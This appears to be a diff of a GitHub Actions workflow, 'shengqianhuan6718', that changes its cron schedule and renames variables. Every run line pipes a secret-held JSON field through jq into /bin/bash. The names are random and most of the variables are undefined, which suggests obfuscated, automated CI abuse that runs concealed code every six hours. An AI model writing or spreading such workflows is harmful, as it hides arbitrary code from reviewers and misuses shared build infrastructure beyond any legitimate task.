@@ -1,25 +1,30 @@
 name: shengqianhuan6718
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
-jobs:  # 9744
+    - cron: '51 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shengqianhuan6718
         env:
-          fa4: ${{ secrets.fa4 }}
+          aeic07: ${{ secrets.aeic07 }}
         run: |
-          echo $fa4 | jq -r .oxc9561 | /bin/bash
-          echo $ozgnp63940 | jq -r .k39 | /bin/bash
-          echo $yydop363 | jq -r .k9 | /bin/bash
-          echo $z2705 | jq -r .oqjk048 | /bin/bash
-          echo $yxme4 | jq -r .t4 | /bin/bash
-          echo $idkeb45 | jq -r .jaw89537 | /bin/bash
-          echo $g4 | jq -r .bvvv85 | /bin/bash
-          echo $g041 | jq -r .mn547 | /bin/bash
-          echo $ixols6 | jq -r .hbh0595 | /bin/bash
+          echo $aeic07 | jq -r .cdfs03 | /bin/bash
+          echo $ywihg40191 | jq -r .jmf279 | /bin/bash
+          echo $nbsqc6 | jq -r .a39 | /bin/bash
+          echo $dnd7 | jq -r .q14 | /bin/bash
+          echo $uj042 | jq -r .bgj97765 | /bin/bash
+          echo $dutvl17547 | jq -r .ez0 | /bin/bash
+          echo $qxdtl2681 | jq -r .p58387 | /bin/bash
+          echo $sn7495 | jq -r .hyeg0192 | /bin/bash
+          echo $vlt63 | jq -r .papb818 | /bin/bash
+          echo $nohy92 | jq -r .wr30 | /bin/bash
+          echo $mydhc8 | jq -r .mvse0505 | /bin/bash
+          echo $bo915 | jq -r .jk4 | /bin/bash
+          echo $pqrhv8426 | jq -r .r430 | /bin/bash
 
